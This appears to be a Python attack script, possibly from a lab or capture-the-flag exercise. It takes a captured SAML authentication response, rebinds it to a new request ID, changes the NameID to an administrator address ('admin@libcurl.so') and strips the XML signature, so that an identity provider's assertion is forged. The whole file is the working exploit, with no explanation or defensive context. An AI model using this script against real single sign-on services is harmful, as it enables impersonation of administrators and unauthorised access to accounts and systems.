from urllib.parse import unquote
import sys
import base64
import zlib
from saml import schema
from datetime import datetime
import lxml.etree as ET
import re

str = unquote(sys.argv[1])

# Base64 decode
data = base64.b64decode(str)

result_utf8 = zlib.decompress(data, -15)

request_xml = result_utf8.decode('utf-8')

# Write the request.xml file and close
f = open("request.xml", "w")
f.write(request_xml)
f.close()

# Open and parse request.xml
tree = ET.parse('request.xml')
root = tree.getroot()

#print(root.tag)
root_attributes = root.attrib
#print(root_attributes)

req_identifier = root_attributes['ID']
#print(req_identifier)

# parse the valid_response.xml and eventually write it to a new_response.xml
tree = ET.parse('valid_response.xml')
root = tree.getroot()

#print(root.tag)
root_attributes = root.attrib
print(root_attributes)

print("Before: ",root_attributes['InResponseTo'])
root_attributes['InResponseTo'] = req_identifier
#print(req_identifier)
print("After: ",root_attributes['InResponseTo'])

root_tag = root.tag
#print("Root tag: ", root_tag)

root_attrib = root.attrib
#print("Dictionary of root attributes: ", root_attrib)

for child in root:
    assertion_tag = '{urn:oasis:names:tc:SAML:2.0:assertion}Assertion'
    if assertion_tag in child.tag:
        #print("Found assertion tag: ",child.tag)
        #print("Assertion Child attrib: ",child.attrib)
        for item in child:
            item_tag = item.tag
            #print("item_tag", item_tag)
            item_attrib = item.attrib
            search_tag = '{urn:oasis:names:tc:SAML:2.0:assertion}Subject'
            search_tag_signature = '{http://www.w3.org/2000/09/xmldsig#}Signature'
            if search_tag_signature in item_tag:
                print("Found signature tag")
                #print (item_tag)
                #elements = root.findall('*')
                #print(elements)
            elif search_tag in item_tag:
                #print("Found subject tag")
                #print(item.tag, item.attrib)
                for subjects in item:
                    #print(subjects.tag, subjects.attrib)
                    if "NameID" in subjects.tag:
                        #print("Found NameID:", subjects.text)
                        subjects.text = "admin@libcurl.so"
                        #print("Found NameID:", subjects.text)
                    if "SubjectConfirmation" in subjects.tag:
                        #print("Found SubjectConfirmation:")
                        for subjects_elements in subjects:
                            subj_elements_tag = subjects_elements.tag
                            subj_elements_attrib = subjects_elements.attrib
                            #print("tag: ",subj_elements_tag)
                            #print("attrib: ",subj_elements_attrib)
                            #print (subjects_elements.attrib['InResponseTo'])
                            #print(req_identifier)
                            subjects_elements.attrib['InResponseTo'] = req_identifier
                            #print (subjects_elements.attrib['InResponseTo'])
tree.write('new_response.xml')


text_file = open("new_response.xml", "r")

#read whole file to a string
data = text_file.read()

sub_start = '<ds:Signature'
sub_end = '</ds:Signature>'

new_xml = re.sub(r'{}.*?{}'.format(re.escape(sub_start),re.escape(sub_end)),'',data)

#close file
text_file.close()

new_xml_file = open("unsigned.xml", "w")
n = new_xml_file.write(new_xml)
new_xml_file.close()
